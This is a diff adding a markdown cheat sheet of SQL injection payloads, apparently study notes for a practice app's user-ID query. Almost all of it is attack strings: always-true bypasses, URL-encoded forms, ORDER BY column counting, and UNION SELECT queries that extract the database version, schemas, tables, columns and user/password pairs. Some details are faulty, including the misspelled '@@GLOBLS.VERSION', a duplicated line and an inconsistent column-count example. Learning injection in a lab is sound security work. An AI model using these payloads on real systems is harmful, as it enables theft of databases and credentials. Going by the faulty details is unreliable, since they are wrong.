@@ -1,0 +1,61 @@
+## Payload One-line explanation
+--------------------------------
+1				=> Normal request that should return the user with ID 1.
+1'				=> Tests whether your single quote breaks the original SQL syntax.
+'				=> Another simple quote test for SQL injection.
+1' OR '1'='1'	=> Makes the condition always true, so multiple users can be returned.
+1' OR 1=1 #		=> Same always-true bypass; # comments out the remaining SQL.
+1' OR 'x'='x' #	=> Uses two identical strings to create an always-true condition.
+1' AND 1=1 #	=> Tests an always-true AND condition.
+1' AND 1=2 #	=> Tests an always-false condition; useful for confirming injection behavior.
+
+-> Sometimes single quote works or sometime it doesn't works
+
+## URL Suitable Formate
+--------------------------------
+Normal -> Blah' OR 1=1--
+URL    -> Blah'+OR+1=1--
+
+-> # not works as comments in URL because # in URL defined as Fragmanted Part which is usually not sent to server.
+
+## Why Extra Single Quote ? 
+--------------------------------
+WHERE user_id = '
+              [ $id ]
+              2' UNION SELECT user,password FROM users #
+              '
+              LIMIT 1;
+
+-> Remaining query part will be commented due to hash(#).
+
+WHERE user_id = '2' UNION SELECT user,password FROM users #' LIMIT 1;
+                ↑                                  		   ↑
+          YOUR quote                         		APPLICATION quote
+
+## Finding the number of columns
+--------------------------------
+1' ORDER BY 1,2,3,4,5 #
+1' ORDER BY 6 #
+
+-> If ORDER BY 5 works but ORDER BY 6 gives an error, the original query probably has 5 columns.
+-> Any Number of column
+
+## Get Database Information
+--------------------------------
+1' UNION SELECT database(),NULL #
+	-> version(), user(), current_user(), @@GLOBLS.VERSION, @@hostname, @@port
+
+## Find Databases
+--------------------------------
+-> 1' UNION SELECT schema_name,NULL FROM information_schema.schemata #
+-> 1' UNION SELECT group_concat(schema_name),NULL FROM information_schema.schemata #
+
+## Find Table
+--------------------------------
+-> 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database() #
+-> 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database() #
+
+## Find Columns
+--------------------------------
+-> 1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_schema=database() #
+-> 1' UNION SELECT column_name,NULL FROM information_schema.columns where table_name='users' #
